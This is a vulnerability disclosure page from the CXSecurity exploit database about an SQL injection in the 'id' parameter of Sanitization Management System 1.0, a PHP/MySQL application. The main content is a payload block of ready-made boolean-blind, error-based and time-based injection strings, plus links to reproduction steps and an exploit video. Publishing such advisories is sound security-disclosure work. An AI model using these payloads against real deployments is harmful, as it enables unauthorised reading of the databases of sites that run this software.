---
title: Sanitization Management System 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2022110041
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-27
fetch_date: 2025-10-03T23:52:38.468829
---

# Sanitization Management System 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Sanitization Management System 1.0 SQL Injection** **2022.11.26**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

## Title: SMS - PHP (by: oretnom23 ) v1.0 SQLi
## Author: nu11secur1ty
## Date: 11.25.2022
## Vendor: https://github.com/oretnom23,
https://www.sourcecodester.com/users/tips23
## Software: https://www.sourcecodester.com/download-code?nid=15770&title=Sanitization+Management+System+Project+in+PHP+and+MySQL+Free+Source+Code
## Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/2022/Sanitization-Management-System-1.0
## Description:
The `id` parameter appears to be vulnerable to SQL injection attacks.
The attacker can get all information from this system by using this
vulnerability.
## STATUS: HIGH Vulnerability - CRITICAL
[+] Payload:
```MySQL
Parameter: id (GET)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
Payload: p=services/view\_service&id=126664801' or '5968'='5975' OR
NOT 5461=5461 AND 'gEud'='gEud
Type: error-based
Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or
GROUP BY clause (FLOOR)
Payload: p=services/view\_service&id=126664801' or '5968'='5975' OR
(SELECT 5753 FROM(SELECT COUNT(\*),CONCAT(0x7176707671,(SELECT
(ELT(5753=5753,1))),0x71767a7071,FLOOR(RAND(0)\*2))x FROM
INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a) AND 'DEYy'='DEYy
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: p=services/view\_service&id=126664801' or '5968'='5975'
AND (SELECT 6369 FROM (SELECT(SLEEP(5)))Rnfu) AND 'PUfi'='PUfi
```
## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/2022/Sanitization-Management-System-1.0)
## Proof and Exploit:
[href](https://streamable.com/rnfvjf)
## Time spent
`00:30:00`

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110041)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top